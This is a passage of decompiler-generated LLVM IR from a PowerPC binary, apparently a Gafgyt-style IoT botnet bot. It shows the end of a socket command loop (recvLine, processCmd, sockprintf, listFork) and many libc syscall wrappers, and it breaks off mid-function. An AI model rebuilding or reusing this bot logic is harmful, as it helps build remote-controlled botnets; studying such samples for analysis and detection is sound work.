  %v3_1000808c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1000e494.168 to i32), i32 268500992)
  %v3_1000809c = icmp eq i32 %v3_1000808c, 0
  br i1 %v3_1000809c, label %dec_label_pc_100080a4, label %dec_label_pc_10007fbc

dec_label_pc_100080a4:                            ; preds = %dec_label_pc_10008080, %dec_label_pc_10007f8c
  %stack_var_-5308.1.lcssa = phi i32 [ 1, %dec_label_pc_10007f8c ], [ %stack_var_-5308.0, %dec_label_pc_10008080 ]
  store i32 268468404, i32* @lr, align 4
  %v3_100080b0 = call i32 @processCmd(i32 %stack_var_-5308.1.lcssa, i32* nonnull %stack_var_-5252)
  %tmp102 = icmp slt i32 %stack_var_-5308.1.lcssa, 2
  br i1 %tmp102, label %dec_label_pc_10008110, label %dec_label_pc_100080d4.lr.ph

dec_label_pc_100080d4.lr.ph:                      ; preds = %dec_label_pc_100080a4
  store i32 1, i32* %stack_var_-5320, align 4
  br label %dec_label_pc_100080d4

dec_label_pc_100080d4:                            ; preds = %dec_label_pc_100080d4.lr.ph, %dec_label_pc_100080d4
  %v3_100080d4 = phi i32 [ 1, %dec_label_pc_100080d4.lr.ph ], [ %v1_100080f8, %dec_label_pc_100080d4 ]
  %v1_100080d8 = mul i32 %v3_100080d4, 4
  %v1_100080e4 = add i32 %v1_100080d8, %v2_100080e0
  %v1_100080e8 = inttoptr i32 %v1_100080e4 to i32*
  %v2_100080e8 = load i32, i32* %v1_100080e8, align 4
  store i32 268468468, i32* @lr, align 4
  %v1_100080f0 = call i32 @free(i32 %v2_100080e8)
  %v3_100080f4 = load i32, i32* %stack_var_-5320, align 4
  %v1_100080f8 = add i32 %v3_100080f4, 1
  store i32 %v1_100080f8, i32* %stack_var_-5320, align 4
  %v2_10008108 = icmp slt i32 %v1_100080f8, %stack_var_-5308.1.lcssa
  br i1 %v2_10008108, label %dec_label_pc_100080d4, label %dec_label_pc_10008110

dec_label_pc_10008110:                            ; preds = %dec_label_pc_100080d4, %dec_label_pc_10007ea0, %dec_label_pc_10007c98, %dec_label_pc_100080a4, %dec_label_pc_10007cf8, %dec_label_pc_10007c4c, %dec_label_pc_10007774
  %v3_10008114 = load i32, i32* @global_var_1001fd98.37, align 4
  %v5_10008128 = call i32 @recvLine(i32 %v3_10008114, i8* %v4_10008128, i32 4096, i32 %v2_10008118)
  %v4_1000813c = icmp eq i32 %v5_10008128, -1
  br i1 %v4_1000813c, label %dec_label_pc_10007738, label %dec_label_pc_10007a2c

dec_label_pc_10008148:                            ; preds = %dec_label_pc_10007ba4, %dec_label_pc_10007b30, %dec_label_pc_10007bf4, %dec_label_pc_10007ae8
  %v0_10008168 = phi i32 [ %v4_10007be4, %dec_label_pc_10007bf4 ], [ %v4_10007b00, %dec_label_pc_10007ae8 ], [ 0, %dec_label_pc_10007b30 ], [ 0, %dec_label_pc_10007ba4 ]
  ret i32 %v0_10008168

; uselistorder directives
  uselistorder i32 %v5_10008128, { 1, 0 }
  uselistorder i32 %v1_100080f8, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5308.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v3_1000808c, { 1, 0 }
  uselistorder i8* %stack_var_-5312.045, { 1, 0 }
  uselistorder i32 %stack_var_-5308.143, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge6, { 1, 0 }
  uselistorder i32 %v1_10007e64, { 1, 0 }
  uselistorder i32 %storemerge1537, { 1, 0 }
  uselistorder i8* %storemerge638, { 1, 0 }
  uselistorder i32 %v1_10007e24, { 1, 0 }
  uselistorder i8* %stack_var_-5280.021, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_10007d40, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_10007cb8, { 1, 0 }
  uselistorder i32 %v2_10007a58, { 1, 0 }
  uselistorder i32 %storemerge13, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge18, { 1, 0, 2 }
  uselistorder i32 %v1_10007960, { 1, 0 }
  uselistorder i32 %v1_10007944, { 1, 0 }
  uselistorder i32 %v3_100078f8, { 1, 0 }
  uselistorder i32 %v1_10007810, { 1, 3, 0, 2 }
  uselistorder i32 %v2_10007eb0, { 4, 2, 1, 3, 5, 0, 6 }
  uselistorder i8* %v4_10008128, { 1, 0 }
  uselistorder i32 %v2_10008118, { 3, 1, 0, 4, 5, 6, 7, 8, 2 }
  uselistorder i32 %v1_1000765c, { 1, 0 }
  uselistorder i32 %v2_1000761c, { 1, 0 }
  uselistorder i32 %storemerge1253, { 1, 0 }
  uselistorder i32* %stack_var_-5320, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e494.168 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 ()* @listFork, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @trim, { 1, 0 }
  uselistorder i32 (i32)* @free, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @malloc, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_1001fda0.42, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @sockprintf, { 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 3, 1, 0, 2 }
  uselistorder i32 (i8*, ...)* @printf, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1000e3c4.137 to i8*), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1000e3bc.136 to i8*), { 1, 0 }
  uselistorder i32 ()* @getCoresAmount, { 1, 0 }
  uselistorder i32 ()* @getEndianness, { 1, 0 }
  uselistorder i32 (i32)* @getBuild, { 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 3, 2, 14, 0, 13, 12, 1, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %argc, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10008148, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10008110, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_100080d4, { 1, 0 }
  uselistorder label %dec_label_pc_10008080, { 1, 0 }
  uselistorder label %dec_label_pc_10007fbc, { 1, 0 }
  uselistorder label %dec_label_pc_10007f8c, { 1, 0 }
  uselistorder label %dec_label_pc_10007f5c, { 1, 0 }
  uselistorder label %dec_label_pc_10007e38, { 1, 0 }
  uselistorder label %dec_label_pc_10007e14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007e00, { 1, 0 }
  uselistorder label %dec_label_pc_10007d74, { 1, 0 }
  uselistorder label %dec_label_pc_10007cd0, { 1, 0 }
  uselistorder label %dec_label_pc_10007c98, { 1, 0 }
  uselistorder label %dec_label_pc_10007c28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007b7c, { 1, 0 }
  uselistorder label %dec_label_pc_10007a98, { 1, 0 }
  uselistorder label %dec_label_pc_10007a20, { 1, 0 }
  uselistorder label %dec_label_pc_1000799c, { 1, 0 }
  uselistorder label %dec_label_pc_1000795c, { 1, 0 }
  uselistorder label %dec_label_pc_10007864, { 1, 0 }
  uselistorder label %dec_label_pc_1000781c, { 1, 0 }
  uselistorder label %dec_label_pc_10007738, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007608, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000817c = icmp eq i32 %arg2, -2143521772
  %v2_10008190 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10008190, i32* %stack_var_-32, align 4
  br i1 %v4_1000817c, label %dec_label_pc_100081f0, label %dec_label_pc_100081b0

dec_label_pc_100081b0:                            ; preds = %entry
  %v3_100081b0 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_100081b0, label %dec_label_pc_100081c8, label %dec_label_pc_100081b8

dec_label_pc_100081b8:                            ; preds = %dec_label_pc_100081b0
  %v3_100081bc = icmp eq i32 %arg2, 1077703699
  br i1 %v3_100081bc, label %dec_label_pc_100081e4, label %dec_label_pc_10008210

dec_label_pc_100081c8:                            ; preds = %dec_label_pc_100081b0
  %v1_100081c8 = xor i32 %arg2, -2143551488
  %v3_100081cc = icmp eq i32 %v1_100081c8, 29717
  br i1 %v3_100081cc, label %dec_label_pc_10008200, label %dec_label_pc_100081d4

dec_label_pc_100081d4:                            ; preds = %dec_label_pc_100081c8
  %v3_100081d8 = icmp eq i32 %v1_100081c8, 29718
  br i1 %v3_100081d8, label %dec_label_pc_10008208, label %dec_label_pc_10008210

dec_label_pc_100081e4:                            ; preds = %dec_label_pc_100081b8
  store i32 ptrtoint (i32* @global_var_100081ec.169 to i32), i32* @lr, align 4
  %v1_100081e8 = inttoptr i32 %arg3 to i32*
  %v2_100081e8 = call i32 @__GI_tcgetattr(i32* %v1_100081e8)
  br label %dec_label_pc_100081f8

dec_label_pc_100081f0:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_100081f4

dec_label_pc_100081f4:                            ; preds = %dec_label_pc_10008208, %dec_label_pc_10008200, %dec_label_pc_100081f0
  store i32 268468728, i32* @lr, align 4
  %v0_100081f4 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_100081f8

dec_label_pc_100081f8:                            ; preds = %dec_label_pc_100081e4, %dec_label_pc_100081f4
  %storemerge = phi i32 [ %v0_100081f4, %dec_label_pc_100081f4 ], [ %v2_100081e8, %dec_label_pc_100081e4 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000823c

dec_label_pc_10008200:                            ; preds = %dec_label_pc_100081c8
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_100081f4

dec_label_pc_10008208:                            ; preds = %dec_label_pc_100081d4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_100081f4

dec_label_pc_10008210:                            ; preds = %dec_label_pc_100081d4, %dec_label_pc_100081b8
  %v0_10008220 = call i32 @__asm_mfcr()
  %v1_10008224 = and i32 %v0_10008220, 268435456
  %v3_10008224 = icmp eq i32 %v1_10008224, 0
  store i32 %v0_10008220, i32* %r31.global-to-local, align 4
  br i1 %v3_10008224, label %dec_label_pc_1000823c, label %dec_label_pc_10008230

dec_label_pc_10008230:                            ; preds = %dec_label_pc_10008210
  %v0_10008230 = call i32 @__errno_location()
  %v0_10008234 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008234 = inttoptr i32 %v0_10008230 to i32*
  store i32 %v0_10008234, i32* %v2_10008234, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000823c

dec_label_pc_1000823c:                            ; preds = %dec_label_pc_10008210, %dec_label_pc_100081f8, %dec_label_pc_10008230
  %v0_10008240 = phi i32 [ %v0_10008220, %dec_label_pc_10008210 ], [ %storemerge, %dec_label_pc_100081f8 ], [ -1, %dec_label_pc_10008230 ]
  ret i32 %v0_10008240

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000823c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100081f8, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_1000825c = load i32, i32* @lr, align 4
  %v1_1000825c = load i1, i1* @cr0_so, align 1
  %v2_1000825c = xor i1 %v1_1000825c, true
  call void @__pseudo_cond_branch(i1 %v2_1000825c, i32 %v0_1000825c)
  %v0_10008260 = call i32 @__syscall_error()
  ret i32 %v0_10008260
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10008278 = add i32 %arg2, -12
  %v2_1000827c = icmp ugt i32 %v1_10008278, 2
  %v2_10008284 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10008284, i32* %stack_var_-32, align 4
  br i1 %v2_1000827c, label %dec_label_pc_100082b0, label %dec_label_pc_100082a0

dec_label_pc_100082a0:                            ; preds = %entry
  store i32 268468904, i32* @lr, align 4
  %v2_100082a4 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_100082a4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100082d0

dec_label_pc_100082b0:                            ; preds = %entry
  %v0_100082b4 = call i32 @__asm_mfcr()
  %v1_100082b8 = and i32 %v0_100082b4, 268435456
  %v3_100082b8 = icmp eq i32 %v1_100082b8, 0
  store i32 %v0_100082b4, i32* %r31.global-to-local, align 4
  br i1 %v3_100082b8, label %dec_label_pc_100082d0, label %dec_label_pc_100082c4

dec_label_pc_100082c4:                            ; preds = %dec_label_pc_100082b0
  %v0_100082c4 = call i32 @__errno_location()
  %v0_100082c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100082c8 = inttoptr i32 %v0_100082c4 to i32*
  store i32 %v0_100082c8, i32* %v2_100082c8, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100082d0

dec_label_pc_100082d0:                            ; preds = %dec_label_pc_100082b0, %dec_label_pc_100082a0, %dec_label_pc_100082c4
  %v0_100082d4 = phi i32 [ %v0_100082b4, %dec_label_pc_100082b0 ], [ %v2_100082a4, %dec_label_pc_100082a0 ], [ -1, %dec_label_pc_100082c4 ]
  ret i32 %v0_100082d4

; uselistorder directives
  uselistorder label %dec_label_pc_100082d0, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_10008300 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10008300, i32* %stack_var_-32, align 4
  %v0_1000831c = call i32 @__asm_mfcr()
  %v1_10008320 = and i32 %v0_1000831c, 268435456
  %v3_10008320 = icmp eq i32 %v1_10008320, 0
  store i32 %v0_1000831c, i32* %r31.global-to-local, align 4
  br i1 %v3_10008320, label %dec_label_pc_10008338, label %dec_label_pc_1000832c

dec_label_pc_1000832c:                            ; preds = %entry
  %v0_1000832c = call i32 @__errno_location()
  %v0_10008330 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008330 = inttoptr i32 %v0_1000832c to i32*
  store i32 %v0_10008330, i32* %v2_10008330, align 4
  br label %dec_label_pc_10008338

dec_label_pc_10008338:                            ; preds = %entry, %dec_label_pc_1000832c
  %v0_10008348 = phi i32 [ %v0_1000831c, %entry ], [ -1, %dec_label_pc_1000832c ]
  ret i32 %v0_10008348

; uselistorder directives
  uselistorder label %dec_label_pc_10008338, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_10008360

dec_label_pc_10008360:                            ; preds = %dec_label_pc_10008360.backedge, %entry
  %v0_1000836c = call i32 @__asm_mfcr()
  %v1_10008370 = and i32 %v0_1000836c, 268435456
  %v3_10008370 = icmp eq i32 %v1_10008370, 0
  store i32 %v0_1000836c, i32* %r31.global-to-local, align 4
  br i1 %v3_10008370, label %dec_label_pc_10008360.backedge, label %dec_label_pc_1000837c

dec_label_pc_1000837c:                            ; preds = %dec_label_pc_10008360
  %v0_1000837c = call i32 @__errno_location()
  %v0_10008380 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008380 = inttoptr i32 %v0_1000837c to i32*
  store i32 %v0_10008380, i32* %v2_10008380, align 4
  br label %dec_label_pc_10008360.backedge

dec_label_pc_10008360.backedge:                   ; preds = %dec_label_pc_1000837c, %dec_label_pc_10008360
  br label %dec_label_pc_10008360
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100083a0 = call i32 @__asm_mfcr()
  %v1_100083a4 = and i32 %v0_100083a0, 268435456
  %v3_100083a4 = icmp eq i32 %v1_100083a4, 0
  store i32 %v0_100083a0, i32* %r31.global-to-local, align 4
  br i1 %v3_100083a4, label %dec_label_pc_100083bc, label %dec_label_pc_100083b0

dec_label_pc_100083b0:                            ; preds = %entry
  %v0_100083b0 = call i32 @__errno_location()
  %v0_100083b4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100083b4 = inttoptr i32 %v0_100083b0 to i32*
  store i32 %v0_100083b4, i32* %v2_100083b4, align 4
  br label %dec_label_pc_100083bc

dec_label_pc_100083bc:                            ; preds = %entry, %dec_label_pc_100083b0
  %v0_100083cc = phi i32 [ %v0_100083a0, %entry ], [ -1, %dec_label_pc_100083b0 ]
  ret i32 %v0_100083cc

; uselistorder directives
  uselistorder label %dec_label_pc_100083bc, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100083e8 = call i32 @__asm_mfcr()
  %v1_100083ec = and i32 %v0_100083e8, 268435456
  %v3_100083ec = icmp eq i32 %v1_100083ec, 0
  store i32 %v0_100083e8, i32* %r31.global-to-local, align 4
  br i1 %v3_100083ec, label %dec_label_pc_10008404, label %dec_label_pc_100083f8

dec_label_pc_100083f8:                            ; preds = %entry
  %v0_100083f8 = call i32 @__errno_location()
  %v0_100083fc = load i32, i32* %r31.global-to-local, align 4
  %v2_100083fc = inttoptr i32 %v0_100083f8 to i32*
  store i32 %v0_100083fc, i32* %v2_100083fc, align 4
  br label %dec_label_pc_10008404

dec_label_pc_10008404:                            ; preds = %entry, %dec_label_pc_100083f8
  %v0_10008414 = phi i32 [ %v0_100083e8, %entry ], [ -1, %dec_label_pc_100083f8 ]
  ret i32 %v0_10008414

; uselistorder directives
  uselistorder label %dec_label_pc_10008404, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008430 = call i32 @__asm_mfcr()
  %v1_10008434 = and i32 %v0_10008430, 268435456
  %v3_10008434 = icmp eq i32 %v1_10008434, 0
  store i32 %v0_10008430, i32* %r31.global-to-local, align 4
  br i1 %v3_10008434, label %dec_label_pc_1000844c, label %dec_label_pc_10008440

dec_label_pc_10008440:                            ; preds = %entry
  %v0_10008440 = call i32 @__errno_location()
  %v0_10008444 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008444 = inttoptr i32 %v0_10008440 to i32*
  store i32 %v0_10008444, i32* %v2_10008444, align 4
  br label %dec_label_pc_1000844c

dec_label_pc_1000844c:                            ; preds = %entry, %dec_label_pc_10008440
  %v0_1000845c = phi i32 [ %v0_10008430, %entry ], [ -1, %dec_label_pc_10008440 ]
  ret i32 %v0_1000845c

; uselistorder directives
  uselistorder label %dec_label_pc_1000844c, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008478 = call i32 @__asm_mfcr()
  %v1_1000847c = and i32 %v0_10008478, 268435456
  %v3_1000847c = icmp eq i32 %v1_1000847c, 0
  store i32 %v0_10008478, i32* %r31.global-to-local, align 4
  br i1 %v3_1000847c, label %dec_label_pc_10008494, label %dec_label_pc_10008488

dec_label_pc_10008488:                            ; preds = %entry
  %v0_10008488 = call i32 @__errno_location()
  %v0_1000848c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000848c = inttoptr i32 %v0_10008488 to i32*
  store i32 %v0_1000848c, i32* %v2_1000848c, align 4
  br label %dec_label_pc_10008494

dec_label_pc_10008494:                            ; preds = %entry, %dec_label_pc_10008488
  %v0_100084a4 = phi i32 [ %v0_10008478, %entry ], [ -1, %dec_label_pc_10008488 ]
  ret i32 %v0_100084a4

; uselistorder directives
  uselistorder label %dec_label_pc_10008494, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_100084b4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268469440, i32* @lr, align 4
  %v2_100084bc = call i32 @getrlimit(i32 7, i32 %v2_100084b4)
  %v1_100084c0 = icmp slt i32 %v2_100084bc, 0
  br i1 %v1_100084c0, label %dec_label_pc_100084d0, label %dec_label_pc_100084cc

dec_label_pc_100084cc:                            ; preds = %entry
  %v3_100084cc = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100084d0

dec_label_pc_100084d0:                            ; preds = %entry, %dec_label_pc_100084cc
  %v0_100084dc = phi i32 [ 256, %entry ], [ %v3_100084cc, %dec_label_pc_100084cc ]
  ret i32 %v0_100084dc

; uselistorder directives
  uselistorder label %dec_label_pc_100084d0, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100084f8 = call i32 @__asm_mfcr()
  %v1_100084fc = and i32 %v0_100084f8, 268435456
  %v3_100084fc = icmp eq i32 %v1_100084fc, 0
  store i32 %v0_100084f8, i32* %r31.global-to-local, align 4
  br i1 %v3_100084fc, label %dec_label_pc_10008514, label %dec_label_pc_10008508

dec_label_pc_10008508:                            ; preds = %entry
  %v0_10008508 = call i32 @__errno_location()
  %v0_1000850c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000850c = inttoptr i32 %v0_10008508 to i32*
  store i32 %v0_1000850c, i32* %v2_1000850c, align 4
  br label %dec_label_pc_10008514

dec_label_pc_10008514:                            ; preds = %entry, %dec_label_pc_10008508
  %v0_10008524 = phi i32 [ %v0_100084f8, %entry ], [ -1, %dec_label_pc_10008508 ]
  ret i32 %v0_10008524

; uselistorder directives
  uselistorder label %dec_label_pc_10008514, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008540 = call i32 @__asm_mfcr()
  %v1_10008544 = and i32 %v0_10008540, 268435456
  %v3_10008544 = icmp eq i32 %v1_10008544, 0
  store i32 %v0_10008540, i32* %r31.global-to-local, align 4
  br i1 %v3_10008544, label %dec_label_pc_1000855c, label %dec_label_pc_10008550

dec_label_pc_10008550:                            ; preds = %entry
  %v0_10008550 = call i32 @__errno_location()
  %v0_10008554 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008554 = inttoptr i32 %v0_10008550 to i32*
  store i32 %v0_10008554, i32* %v2_10008554, align 4
  br label %dec_label_pc_1000855c

dec_label_pc_1000855c:                            ; preds = %entry, %dec_label_pc_10008550
  %v0_1000856c = phi i32 [ %v0_10008540, %entry ], [ -1, %dec_label_pc_10008550 ]
  ret i32 %v0_1000856c

; uselistorder directives
  uselistorder label %dec_label_pc_1000855c, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008588 = call i32 @__asm_mfcr()
  %v1_1000858c = and i32 %v0_10008588, 268435456
  %v3_1000858c = icmp eq i32 %v1_1000858c, 0
  store i32 %v0_10008588, i32* %r31.global-to-local, align 4
  br i1 %v3_1000858c, label %dec_label_pc_100085a4, label %dec_label_pc_10008598

dec_label_pc_10008598:                            ; preds = %entry
  %v0_10008598 = call i32 @__errno_location()
  %v0_1000859c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000859c = inttoptr i32 %v0_10008598 to i32*
  store i32 %v0_1000859c, i32* %v2_1000859c, align 4
  br label %dec_label_pc_100085a4

dec_label_pc_100085a4:                            ; preds = %entry, %dec_label_pc_10008598
  %v0_100085b4 = phi i32 [ %v0_10008588, %entry ], [ -1, %dec_label_pc_10008598 ]
  ret i32 %v0_100085b4

; uselistorder directives
  uselistorder label %dec_label_pc_100085a4, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100085cc = and i32 %arg2, 64
  %v3_100085cc = icmp eq i32 %v1_100085cc, 0
  br i1 %v3_100085cc, label %dec_label_pc_100085f8, label %dec_label_pc_100085dc

dec_label_pc_100085dc:                            ; preds = %entry
  %v2_100085e4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100085e4, i32* %stack_var_-32, align 4
  %v0_100085f4 = load i32, i32* @r5, align 4
  br label %dec_label_pc_100085f8

dec_label_pc_100085f8:                            ; preds = %entry, %dec_label_pc_100085dc
  %v0_100085f8 = phi i32 [ 0, %entry ], [ %v0_100085f4, %dec_label_pc_100085dc ]
  store i32 %v0_100085f8, i32* @r5, align 4
  %v0_10008600 = call i32 @__asm_mfcr()
  %v1_10008604 = and i32 %v0_10008600, 268435456
  %v3_10008604 = icmp eq i32 %v1_10008604, 0
  store i32 %v0_10008600, i32* %r31.global-to-local, align 4
  br i1 %v3_10008604, label %dec_label_pc_1000861c, label %dec_label_pc_10008610

dec_label_pc_10008610:                            ; preds = %dec_label_pc_100085f8
  %v0_10008610 = call i32 @__errno_location()
  %v0_10008614 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008614 = inttoptr i32 %v0_10008610 to i32*
  store i32 %v0_10008614, i32* %v2_10008614, align 4
  br label %dec_label_pc_1000861c

dec_label_pc_1000861c:                            ; preds = %dec_label_pc_100085f8, %dec_label_pc_10008610
  %v0_1000862c = phi i32 [ %v0_10008600, %dec_label_pc_100085f8 ], [ -1, %dec_label_pc_10008610 ]
  ret i32 %v0_1000862c

; uselistorder directives
  uselistorder label %dec_label_pc_1000861c, { 1, 0 }
  uselistorder label %dec_label_pc_100085f8, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_1000863c = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_1000863c
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008658 = call i32 @__asm_mfcr()
  %v1_1000865c = and i32 %v0_10008658, 268435456
  %v3_1000865c = icmp eq i32 %v1_1000865c, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10008658, i32* %r31.global-to-local, align 4
  br i1 %v3_1000865c, label %dec_label_pc_10008674, label %dec_label_pc_10008668

dec_label_pc_10008668:                            ; preds = %entry
  %v0_10008668 = call i32 @__errno_location()
  %v0_1000866c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000866c = inttoptr i32 %v0_10008668 to i32*
  store i32 %v0_1000866c, i32* %v2_1000866c, align 4
  br label %dec_label_pc_10008674

dec_label_pc_10008674:                            ; preds = %entry, %dec_label_pc_10008668
  %v0_10008684 = phi i32 [ %v0_10008658, %entry ], [ -1, %dec_label_pc_10008668 ]
  ret i32 %v0_10008684

; uselistorder directives
  uselistorder label %dec_label_pc_10008674, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100086a0 = call i32 @__asm_mfcr()
  %v1_100086a4 = and i32 %v0_100086a0, 268435456
  %v3_100086a4 = icmp eq i32 %v1_100086a4, 0
  store i32 %v0_100086a0, i32* %r31.global-to-local, align 4
  br i1 %v3_100086a4, label %dec_label_pc_100086bc, label %dec_label_pc_100086b0

dec_label_pc_100086b0:                            ; preds = %entry
  %v0_100086b0 = call i32 @__errno_location()
  %v0_100086b4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100086b4 = inttoptr i32 %v0_100086b0 to i32*
  store i32 %v0_100086b4, i32* %v2_100086b4, align 4
  br label %dec_label_pc_100086bc

dec_label_pc_100086bc:                            ; preds = %entry, %dec_label_pc_100086b0
  %v0_100086cc = phi i32 [ %v0_100086a0, %entry ], [ -1, %dec_label_pc_100086b0 ]
  ret i32 %v0_100086cc

; uselistorder directives
  uselistorder label %dec_label_pc_100086bc, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100086e8 = call i32 @__asm_mfcr()
  %v1_100086ec = and i32 %v0_100086e8, 268435456
  %v3_100086ec = icmp eq i32 %v1_100086ec, 0
  store i32 %v0_100086e8, i32* %r31.global-to-local, align 4
  br i1 %v3_100086ec, label %dec_label_pc_10008704, label %dec_label_pc_100086f8

dec_label_pc_100086f8:                            ; preds = %entry
  %v0_100086f8 = call i32 @__errno_location()
  %v0_100086fc = load i32, i32* %r31.global-to-local, align 4
  %v2_100086fc = inttoptr i32 %v0_100086f8 to i32*
  store i32 %v0_100086fc, i32* %v2_100086fc, align 4
  br label %dec_label_pc_10008704

dec_label_pc_10008704:                            ; preds = %entry, %dec_label_pc_100086f8
  %v0_10008714 = phi i32 [ %v0_100086e8, %entry ], [ -1, %dec_label_pc_100086f8 ]
  ret i32 %v0_10008714

; uselistorder directives
  uselistorder label %dec_label_pc_10008704, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
